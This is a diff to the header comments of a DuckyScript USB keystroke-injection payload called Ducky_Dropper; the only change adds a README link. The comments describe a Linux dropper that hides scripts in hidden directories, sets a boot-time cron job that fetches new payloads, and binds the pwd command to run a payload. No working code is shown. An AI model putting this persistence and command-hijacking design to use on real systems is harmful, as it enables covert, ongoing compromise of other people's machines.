@@ -1,7 +1,7 @@
 REM TITLE: Ducky_Dropper
 REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
 REM TARGET OS: Linux (tested on Kali Linux release 2025.2)
-REM DESCRIPTION: --> See README.md for full information <--
+REM DESCRIPTION: --> See README.md for full information (https://github.com/OSINTI4L/DuckyScript-Payloads/blob/main/Payloads/Ducky_Dropper/README.md) <--
 REM DESCRIPTION: This is the delivery system for the initial gathering and setup of Ducky_Dropper (cron_dropper.sh and payload.sh). It gathers the scripts, gives them execution permissions, places them in hidden directories, creates a cronjob that will call for new payloads 60 seconds after machine boot (cron_dropper.sh), and binds the pwd command to execute payload.sh.
 REM DESCRIPTION: The source to your cron_dropper.sh script must be added to line 8 and source to your payload added to line 9. Ducky_Dropper scripts have been added for demonstration purposes, replace with your own.
 
